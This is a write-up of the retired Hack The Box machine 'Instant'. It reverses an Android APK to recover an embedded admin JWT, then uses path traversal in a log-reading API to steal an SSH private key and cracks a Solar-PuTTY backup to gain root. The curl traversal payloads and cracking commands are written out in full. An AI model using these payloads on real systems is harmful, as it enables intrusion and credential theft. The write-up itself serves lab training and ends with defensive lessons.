---
title: "Hack The Box — Instant"
summary: "An Android APK reveals an admin JWT and API hosts; log path traversal exposes an SSH key, while a cracked Solar-PuTTY backup yields root access."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Medium"
os: "Linux"
solvedAt: 2026-11-14
publishedAt: 2026-11-14
tags:
  - android
  - apk-reversing
  - jwt
  - api-security
  - path-traversal
  - arbitrary-file-read
  - ssh
  - password-cracking
  - privilege-escalation
tools:
  - Nmap
  - Apktool
  - ripgrep
  - curl
  - jq
  - SSH
  - SolarPuttyCracker
cves: []
htbUrl: "https://app.hackthebox.com/machines/630"
cover: "/images/writeups/hackthebox/machines/instant/cover.png"
coverAlt: "Hack The Box Instant machine logo showing a wallet and coins inside an orange ring"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. A [March 2025 retrospective](https://medium.com/@nishanbasnet3636/instant-htb-season-6-590a039a27b4) explicitly describes Instant as retired, and a separate [retired-machine write-up collection](https://jacobkrell.com/writeups/ctf-writeups) includes it. Flag values, the admin JWT, the SSH private key, the decrypted root password and personal VPN details are omitted. Each can be recovered in your own lab instance by following the steps below.

## Executive summary

Instant exposes a wallet website and a downloadable Android APK. Static analysis of the APK reveals two HTTP virtual hosts and an admin JWT embedded in client code. The JWT authorizes an API endpoint meant to read log files, but its file-name parameter accepts `../` and reaches the `shirohige` user's SSH private key. That key gives a user shell. A readable Solar-PuTTY session backup under `/opt/backups` can be cracked offline with a wordlist; the decrypted session contains root credentials, which work with `su`.

## Target information

| Item | Value |
| --- | --- |
| Target | Instant |
| Platform | Hack The Box |
| Difficulty | Medium |
| Operating system | Linux |
| Machine ID | [630](https://app.hackthebox.com/machines/630) |
| Main host | `instant.htb` |

Start in a working directory on Kali. Replace the example IP with the address assigned to **your** Instant instance; HTB instance addresses can differ between sessions.

```bash
mkdir -p ~/Documents/HackTheBox/Instant
cd ~/Documents/HackTheBox/Instant
export TARGET_IP='<YOUR_INSTANT_IP>'
```

## Enumeration

The full TCP scan showed only SSH and HTTP. The HTTP response redirected to `instant.htb`, so a direct request to the IP was not enough to see the intended site.

```bash
nmap -sC -sV -p- "$TARGET_IP"
```

| Port | Observation | Why it mattered |
| --- | --- | --- |
| 22/tcp | OpenSSH 9.6p1 on Ubuntu | A recovered account or private key could provide a shell. |
| 80/tcp | Apache 2.4.58; redirect to `instant.htb` | The website supplied the mobile app to inspect. |

Map the host name to the instance IP and visit `http://instant.htb/`. The landing page has a **Download Now** button for `instant.apk`.

```bash
echo "$TARGET_IP instant.htb" | sudo tee -a /etc/hosts
curl -fL 'http://instant.htb/downloads/instant.apk' -o instant.apk
file instant.apk
```

If you used the browser download button, check `ls -l instant.apk` before downloading again. In my session the browser's download popup said the file had moved, while the APK was already present in the working directory.

### Find the API virtual hosts in the APK

Decode the Android resources and inspect the network configuration:

```bash
apktool d instant.apk -o apk-out
cat apk-out/res/xml/network_security_config.xml
```

The important entries are:

```xml
<domain includeSubdomains="true">mywalletv1.instant.htb</domain>
<domain includeSubdomains="true">swagger-ui.instant.htb</domain>
```

The app explicitly allows cleartext HTTP traffic to these hosts. They are HTTP virtual hosts on the same target IP, so add them to `/etc/hosts` and inspect the Swagger UI:

```bash
echo "$TARGET_IP mywalletv1.instant.htb swagger-ui.instant.htb" | sudo tee -a /etc/hosts
```

Open `http://swagger-ui.instant.htb/` in the browser. Its API documentation shows an admin log-reading route, `/api/v1/admin/read/log`, whose `log_file_name` parameter deserves closer inspection.

### Extract the hardcoded admin JWT

Search the decoded APK for API hosts, authorization code and JWT-shaped strings. The `AdminActivities.smali` class contains a `TestAdminAuthorization` method and a hardcoded admin token.

```bash
rg -n 'mywalletv1|swagger-ui|TestAdminAuthorization|eyJhbG' apk-out
sed -n '16,55p' apk-out/smali/com/instantlabs/instant/AdminActivities.smali
```

Extract the JWT into a shell variable without printing or copying the secret into your notes:

```bash
TOKEN=$(rg -o 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' \
  apk-out/smali/com/instantlabs/instant/AdminActivities.smali | head -n1)
test -n "$TOKEN" && echo 'Admin JWT extracted'
```

The token belongs to an administrator role. Because it is in a client-side APK, anyone who downloads the app can recover it. The API expects its value directly in the `Authorization` header, without a `Bearer` prefix.

## Initial access: log path traversal to SSH

First, use the documented log route to test an ordinary file. The admin API also exposes a log-listing route; its output identifies a log file such as `1.log` under `/home/shirohige/logs/`. An authorized request to the read route establishes the response shape:

```bash
curl -s -H "Authorization: $TOKEN" \
  'http://mywalletv1.instant.htb/api/v1/admin/view/logs' | jq

curl -sG -H "Authorization: $TOKEN" \
  --data-urlencode 'log_file_name=1.log' \
  'http://mywalletv1.instant.htb/api/v1/admin/read/log' | jq
```

The server builds a path from the log directory and the supplied name. It does not constrain the resulting path to that directory. A `../` segment moves from `/home/shirohige/logs/` to `/home/shirohige/`, where the user's SSH key resides. Validate the file read with a harmless system file if desired, then request the key:

```bash
curl -sG -H "Authorization: $TOKEN" \
  --data-urlencode 'log_file_name=../../../../etc/passwd' \
  'http://mywalletv1.instant.htb/api/v1/admin/read/log' | jq

curl -sG -H "Authorization: $TOKEN" \
  --data-urlencode 'log_file_name=../.ssh/id_rsa' \
  'http://mywalletv1.instant.htb/api/v1/admin/read/log' \
  -o response.json
```

The key arrives as an array of text lines in a JSON property whose name ends in `/id_rsa`; the response also has `"Status": 201`. Reassemble the lines rather than copying the JSON display, which would leave quotes and escaped newlines in the private-key file.

```bash
jq -r 'to_entries[] | select(.key | endswith("/id_rsa")) | .value | join("")' \
  response.json > id_rsa
chmod 600 id_rsa
head -n1 id_rsa
ssh-keygen -y -f id_rsa > /dev/null
```

In this lab the header was `-----BEGIN OPENSSH PRIVATE KEY-----`. A successful `ssh-keygen -y` with no error confirms the reconstructed file is parseable. Now log in and verify the account:

```bash
ssh -i id_rsa shirohige@"$TARGET_IP"
id
ls -l ~/user.txt
```

The `user.txt` file is available in `shirohige`'s home directory. Its flag value is intentionally omitted here.

## Privilege escalation: Solar-PuTTY session backup

Local enumeration under `/opt` reveals an encrypted Solar-PuTTY export. Solar-PuTTY stores SSH session settings and can include saved credentials. Reading the raw `.dat` file does not reveal the password directly; copy it intact to Kali for offline analysis.

```bash
# Run on Instant as shirohige:
ls -la /opt
ls -l /opt/backups/Solar-PuTTY/sessions-backup.dat
```

In a **second Kali terminal**, from the working directory containing `id_rsa`:

```bash
export TARGET_IP='<YOUR_INSTANT_IP>'
scp -i id_rsa \
  shirohige@"$TARGET_IP":/opt/backups/Solar-PuTTY/sessions-backup.dat .
file sessions-backup.dat
```

[VoidSec's SolarPuttyDecrypt research](https://voidsec.com/solarputtydecrypt/) explains the session encryption format. The [SolarPuttyCracker](https://github.com/ItsWatchMakerr/SolarPuttyCracker) implementation adds wordlist testing, so the export password can be found without knowing it in advance. Use a virtual environment to keep Python dependencies local:

```bash
git clone https://github.com/ItsWatchMakerr/SolarPuttyCracker.git
cd SolarPuttyCracker
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

On some Kali installations `rockyou.txt` is still compressed. If the plain file is absent, expand it into your working directory and point the cracker there:

```bash
if [ -f /usr/share/wordlists/rockyou.txt ]; then
  WORDLIST=/usr/share/wordlists/rockyou.txt
else
  zcat /usr/share/wordlists/rockyou.txt.gz > ../rockyou.txt
  WORDLIST=../rockyou.txt
fi

python3 SolarPuttyCracker.py -w "$WORDLIST" -o decrypted.txt \
  ../sessions-backup.dat
```

After successful decryption, inspect the `Credentials` array. The relevant record has `Username` set to `root`; its `Password` value is the credential needed for the final step.

```bash
jq -r '.Credentials[] | select(.Username == "root") | .Password' decrypted.txt
```

Back in the existing `shirohige` SSH session, switch users and verify effective privileges:

```bash
su root
id
ls -l /root/root.txt
```

Enter the password recovered from `decrypted.txt` when `su` prompts. `id` should report `uid=0(root)`. The root flag value is omitted.

## What did not work

- On my Kali installation, `jadx -d jadx-out instant.apk` failed because its launcher looked for the relative APK path under `/usr/share/jadx/bin/`. `apktool` had already exposed the needed smali and XML; alternatively, `jadx -d "$PWD/jadx-out" "$PWD/instant.apk"` uses absolute paths.
- The Firefox download popup said the APK was missing, but `ls` showed it in the project directory. Checking the filesystem avoided an unnecessary repeat download.

## Attack path

1. Enumerate SSH and HTTP; follow the web redirect and download `instant.apk`.
2. Decode the APK to discover the API and Swagger virtual hosts plus a hardcoded admin JWT.
3. Use the JWT on the log-reading API and traverse out of the log directory to recover `shirohige`'s SSH key.
4. Log in as `shirohige` and identify the Solar-PuTTY backup under `/opt/backups`.
5. Crack the backup's export password offline, read the saved root credential and use `su root`.

## Lessons learned

- Client applications are a source of API hosts, endpoints and embedded secrets. A hardcoded admin JWT cannot be kept private in a distributable APK. Remove privileged credentials from clients and rotate exposed tokens.
- Authorization alone did not make the log reader safe. Resolve and validate requested paths server-side, then enforce an allowlist of log file names instead of accepting traversal segments.
- A backup containing reusable root credentials becomes a privilege-escalation path when a lower-privileged user can read it and its export password is guessable. Limit backup access, use a strong unique export password and avoid storing root passwords in session managers.
- Preserve structured responses and binary artifacts accurately. The JSON array had to be joined into a valid SSH key, and the `.dat` backup had to be transferred intact before cracking.

## References

- [Hack The Box — Instant machine](https://app.hackthebox.com/machines/630)
- [Instant identified as recently retired, March 2025](https://medium.com/@nishanbasnet3636/instant-htb-season-6-590a039a27b4)
- [Hack The Box publication guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [Android network security configuration](https://developer.android.com/privacy-and-security/security-config)
- [SolarPuttyDecrypt research by VoidSec](https://voidsec.com/solarputtydecrypt/)
- [SolarPuttyCracker source and usage](https://github.com/ItsWatchMakerr/SolarPuttyCracker)
